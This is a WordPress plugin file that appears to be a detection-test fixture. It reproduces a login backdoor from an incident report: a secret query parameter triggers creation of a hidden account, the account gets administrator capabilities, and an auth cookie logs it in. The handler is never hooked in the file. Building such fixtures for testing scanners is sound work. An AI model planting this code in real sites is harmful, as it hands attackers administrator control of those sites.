<?php
/**
 * Plugin Name: Synthetic Login Backdoor
 * Description: Validation fixture, inert. The function below is never hooked or called. It emulates only the shape of the login backdoor in incident report MSP-WO-IR-2026-001 (request-parameter trigger, account creation, privileged capability, authentication cookie).
 */
if (!defined('ABSPATH')) {
    exit;
}

function synthetic_login_backdoor_handler()
{
    if (!isset($_GET['synthetic_trigger']) || $_GET['synthetic_trigger'] !== 'SYNTHETIC_FIXTURE_TOKEN') {
        return;
    }

    $user = get_user_by('login', 'synthetic-account');
    if (!$user) {
        $user_id = wp_create_user('synthetic-account', 'SYNTHETIC_PASSWORD', 'nobody@example.invalid');
        $user    = get_user_by('id', $user_id);
    }

    $user->add_cap('manage_options');
    $user->add_cap('install_plugins');

    wp_set_current_user($user->ID);
    wp_set_auth_cookie($user->ID, true);
    wp_safe_redirect(admin_url());
    exit;
}
